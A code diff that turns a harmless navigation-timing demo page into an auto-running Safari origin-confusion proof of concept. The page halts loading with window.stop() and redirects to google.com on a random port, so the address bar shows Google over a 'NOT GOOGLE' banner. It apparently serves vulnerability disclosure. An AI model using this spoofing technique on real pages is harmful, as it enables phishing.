@@ -1,39 +1,48 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Navigation Timing Observation</title>
+<meta charset="utf-8">
+<title>Safari Origin Confusion PoC</title>
 </head>
-<body>
 
-<h2>Navigation Timing Demo (Safe)</h2>
-<button id="trigger">Start navigation</button>
-
-<pre id="log"></pre>
+<body style="
+  margin:0;
+  background:#b00000;
+  color:white;
+  font-family:-apple-system;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+  font-size:48px;
+  text-align:center;
+">
+  <div>
+    NOT GOOGLE<br>
+    Origin Confusion Demo
+  </div>
 
 <script>
-const logEl = document.getElementById("log");
-const start = performance.now();
+function spoof() {
+    // delay sebentar biar user siap
+    setTimeout(() => {
+        // Stop loading halaman ini (Safari akan tetap render apa yang sudah terlihat)
+        window.stop();
 
-function log(msg) {
-  const t = (performance.now() - start).toFixed(1);
-  logEl.textContent += `[+${t} ms] ${msg}\n`;
+        // pilih port random (tidak 0 atau 443)
+        let randomPort;
+        do {
+            randomPort = Math.floor(Math.random() * 1000);
+        } while (randomPort === 0 || randomPort === 443);
+
+        // ganti top-level location
+        document.location = "https://google.com:" + randomPort + "/";
+    }, 500); // 0.5 detik, cukup untuk render halaman merah
+
 }
 
-document.getElementById("trigger").onclick = () => {
-  log("User interaction");
-
-  setTimeout(() => {
-    log("Initiating top-level navigation to example.com");
-    window.location.href = "https://google.com:00";
-  }, 2000);
-};
-
-window.addEventListener("beforeunload", () => log("beforeunload fired"));
-window.addEventListener("pagehide", () => log("pagehide fired"));
-document.addEventListener("visibilitychange", () =>
-  log("visibility: " + document.visibilityState)
-);
+// jalankan PoC otomatis
+spoof();
 </script>
 
 </body>
